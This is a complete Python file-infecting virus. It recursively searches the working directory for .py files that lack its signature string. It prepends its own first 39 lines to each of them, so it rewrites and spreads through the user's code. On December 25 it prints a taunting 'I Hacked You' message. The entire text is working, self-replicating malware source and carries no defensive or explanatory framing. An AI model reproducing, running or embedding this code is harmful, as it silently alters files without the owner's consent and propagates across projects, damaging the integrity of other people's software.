#!/usr/bin/python
import os
import datetime
SIGNATURE = "No System İs Safe"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for filename in filelist:
        if os.path.isdir(path+"/"+filename):
            filestoinfect.extend(search(path+"/"+filename))
        elif filename[-3:] == ".py":
            infected = False
            for line in open(path+"/"+filename):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+filename)
    return filestoinfect

def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def attack():
    if datetime.datetime.now().month == 12 and datetime.datetime.now().day == 25:
        print("Merry Christmas, I Hacked You!")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
attack()